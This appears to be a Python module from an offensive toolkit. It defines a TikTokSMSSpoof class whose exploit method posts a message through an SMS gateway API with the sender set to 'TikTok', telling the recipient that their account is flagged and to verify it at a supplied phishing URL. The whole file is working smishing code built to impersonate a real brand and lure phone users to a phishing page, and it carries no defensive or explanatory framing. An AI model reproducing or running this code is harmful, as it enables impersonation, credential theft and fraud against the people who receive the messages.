import requests
from modules.utils import logger

class TikTokSMSSpoof:
    def __init__(self, api_key, gateway_url):
        self.api_key = api_key
        self.gateway_url = gateway_url

    def exploit(self, phone, phishing_url):
        if not self.api_key:
            return {'success': False, 'output': 'No SMS API key'}
        msg = f"TikTok: Your account is flagged. Verify here: {phishing_url}"
        payload = {'to': phone, 'from': 'TikTok', 'message': msg}
        headers = {'Authorization': f'Bearer {self.api_key}'}
        try:
            resp = requests.post(self.gateway_url, json=payload, headers=headers, timeout=30)
            if resp.status_code == 200:
                return {'success': True, 'output': f'Spoofed SMS sent to {phone}'}
            else:
                return {'success': False, 'output': f'Gateway error: {resp.text[:200]}'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
